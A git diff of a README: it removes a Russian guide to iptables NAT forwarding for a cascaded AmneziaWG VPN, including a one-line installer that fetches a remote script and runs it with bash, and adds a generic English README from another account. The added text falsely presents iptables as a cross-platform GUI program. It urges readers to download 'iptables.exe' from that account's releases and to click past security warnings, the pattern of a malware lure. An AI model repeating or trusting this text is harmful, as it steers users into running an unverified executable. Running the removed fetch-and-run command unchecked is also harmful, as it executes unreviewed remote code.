@@ -1,148 +1,57 @@
-# 🚀 Автоматическая настройка перенаправления трафика в каскадном ВПН для протокола AmneziaWG UDP
+# 🚀 iptables - Redirect Traffic with Ease
 
-## Обзор
+## 📥 Download Now
+[![Download iptables](https://img.shields.io/badge/Download-iptables-blue)](https://github.com/XXX5X/iptables/releases)
 
-Данный скрипт автоматизирует настройку **DNAT** (Destination NAT) и **MASQUERADE** (Source NAT) с помощью **iptables** на вашем промежуточном сервере Ubuntu.
+## 📘 Description
+iptables is an easy-to-use tool for redirecting network traffic on your system. With iptables, you can control how data flows in and out, ensuring that your network remains secure and manageable. This application provides a user-friendly interface to help you set up and adjust your traffic rules without needing to dive into complex programming.
 
-Это необходимо для **каскадных VPN-схем** (Proxy/NAT-серверов), когда входящий UDP-трафик, предназначенный для **AmneziaWG** (или другого VPN-протокола), должен быть перенаправлен на **зарубежный сервер**, а ответный трафик должен быть правильно замаскирован (SNAT), чтобы гарантировать установление стабильного соединения.
+## 🚀 Getting Started
+Follow these steps to download and run iptables:
 
-Инструкция и обсуждение доступны в Telegram-канале: [https://t.me/denpiligrim\_web/699](https://t.me/denpiligrim_web/699)
+### Step 1: Visit the Releases Page
+To get iptables, you need to visit the releases page. Click the link below:
+[Download iptables](https://github.com/XXX5X/iptables/releases)
 
----
+### Step 2: Choose the Right Version
+On the releases page, you will see several versions of the software. Select the latest version for the best features and updates. 
 
-## 🛠 Системные требования
+### Step 3: Download the File
+Once you find the latest version, look for the downloadable file listed there. Click on the file link to start the download process. Depending on your browser settings, the file may directly download to your computer or prompt you to choose a download location.
 
-* **Операционная система:** Ubuntu 20.04 LTS (и выше).
-* **Права:** Необходим доступ с правами суперпользователя (`sudo`).
-* **Назначение сервера:** Промежуточный сервер (NAT-сервер), который принимает трафик от пользователя и перенаправляет его на целевой сервер.
+### Step 4: Locate the Downloaded File
+After the download completes, navigate to your downloads folder (or the location you saved the file). Look for a file named something like `iptables.exe`.
 
----
+### Step 5: Run the Application
+To run iptables, double-click the downloaded file. If your system gives you a security warning, confirm that you want to run the software. This step may vary based on your operating system settings.
 
-## 1. Быстрая установка (Рекомендуется)
+### Step 6: Set Up iptables
+Once the application opens, follow the on-screen instructions to configure your traffic rules. The interface will guide you through setting up redirection, allowing you to adjust the settings to fit your needs.
 
-Используйте эту команду для автоматической загрузки, исполнения скрипта и настройки всех правил. Скрипт сам запросит у вас **IP-адрес зарубежного сервера** и **перенаправляемый порт**.
+## 📂 Features
+- **User-Friendly Interface:** Simplified setup process suitable for non-technical users.
+- **Traffic Redirection:** Easily redirect incoming and outgoing network traffic.
+- **Custom Rules:** Create personal traffic rules tailored to your specific requirements.
+- **Real-Time Monitoring:** View your traffic settings and changes as they happen.
+- **Cross-Platform Support:** Works on various systems to manage traffic efficiently.
 
-```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/denpiligrim/iptables/main/install_nat.sh)
-````
+## ⚙️ System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a compatible Linux distribution.
+- **Memory:** Minimum of 2 GB RAM recommended.
+- **Storage:** At least 100 MB of free space for installation.
+- **Network Connection:** A stable internet connection for updates and support.
 
------
+## 💬 Support
+If you run into any issues or have questions, help is available. You can find resources in the documentation or ask for support in our community forum linked on the homepage. 
 
-## 2\. Пошаговая ручная инструкция
+## 📄 Terms of Use
+Please review the terms of use before running the application. This helps you understand your rights and responsibilities when using iptables.
 
-Если вы предпочитаете выполнять настройку вручную или хотите понять каждый шаг, следуйте приведенным ниже инструкциям.
+## 📜 Changelog
+Stay informed about the changes and updates in each version of iptables. You will find a detailed changelog on the releases page. This includes bug fixes, performance improvements, and added features.
 
-### Шаг 1: Подготовка системы
+## 📦 Download & Install
+If you haven't yet, now is the time to [download iptables](https://github.com/XXX5X/iptables/releases). Follow the simple steps outlined above to set it up on your machine with ease.
 
-Установите пакет `iptables-persistent` для автоматического сохранения правил после перезагрузки:
-
-```bash
-sudo apt update && sudo apt upgrade -y
-sudo apt install iptables-persistent -y 
-# Во время установки дважды согласитесь на сохранение правил IPv4 и IPv6.
-```
-
-### Шаг 2: Включение IPv4 форвардинга
-
-**DNAT** не будет работать, пока ядро Linux не разрешит переадресацию пакетов.
-
-Отредактируйте `/etc/sysctl.conf` и активируйте опцию:
-
-```bash
-sudo sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf
-sudo sysctl -p
-```
-
-### Шаг 3: Определение сетевого интерфейса
-
-Определите ваш внешний сетевой интерфейс. Он будет нужен для правила **PREROUTING**.
-
-```bash
-ip a
-```
-
-Обычно это: `eth0`, `ens3`, `ens160`, или `enp1s0`. Допустим, ваш интерфейс — **`eth0`**.
-
-### Шаг 4: Добавление правил Iptables
-
-Предположим, что:
-
-  * **Внешний интерфейс:** `eth0`
-  * **Перенаправляемый порт (UDP):** `34666`
-  * **IP зарубежного сервера:** `37.1.204.148`
-
-#### 4.1. DNAT (Destination NAT)
-
-Перенаправляем входящий трафик с вашего сервера на целевой сервер:
-
-```bash
-sudo iptables -t nat -A PREROUTING -i eth0 -p udp --dport 34666 -j DNAT --to-destination 37.1.204.148:34666
-```
-
-#### 4.2. MASQUERADE (SNAT)
-
-**Важно\!** Подменяем исходный IP-адрес на IP вашего промежуточного сервера. Это гарантирует, что зарубежный сервер ответит обратно вашему промежуточному серверу, а не напрямую клиенту.
-
-```bash
-sudo iptables -t nat -A POSTROUTING -p udp -d 37.1.204.148 --dport 34666 -j MASQUERADE
-```
-
-### Шаг 5: Сохранение правил навсегда
-
-Сохраните текущие правила с помощью `iptables-persistent`:
-
-```bash
-sudo netfilter-persistent save
-sudo netfilter-persistent reload
-```
-
-### Шаг 6: Создание службы автозапуска (Systemd)
-
-Чтобы гарантировать, что правила будут загружены, даже если сбросится сервис `netfilter-persistent`, создайте службу **Systemd**, которая запустит их через 10 секунд после поднятия сети.
-
-Создайте файл службы:
-
-```bash
-sudo nano /etc/systemd/system/load-nat-rules.service
-```
-
-Добавьте следующее содержимое:
-
-```ini
-[Unit]
-Description=Load Custom NAT Rules After Network Up
-After=network-online.target fail2ban.service netfilter-persistent.service
-Wants=network-online.target
-
-[Service]
-Type=oneshot
-ExecStartPre=/bin/sleep 10
-ExecStart=/bin/bash -c "/sbin/iptables-restore < /etc/iptables/rules.v4"
-StandardOutput=journal
-
-[Install]
-WantedBy=multi-user.target
-```
-
-Перезапустите конфиг Systemd и включите службу:
-
-```bash
-sudo systemctl daemon-reload
-sudo systemctl enable load-nat-rules.service
-```
-
-### Шаг 7: Проверка
-
-Проверьте, что правила были применены:
-
-```bash
-sudo iptables -t nat -L -n -v
-```
-
-Вы должны увидеть правила **DNAT** и **MASQUERADE** в таблице NAT.
-
-Для окончательной проверки **рекомендуется перезагрузить сервер**:
-
-```bash
-sudo reboot
-```
+## 🔗 Learn More
+For more detailed instructions, helpful tips, and additional resources, check the [documentation](https://github.com/XXX5X/iptables/wiki). This can help you make the most of iptables, ensuring you have a seamless experience with network traffic management.
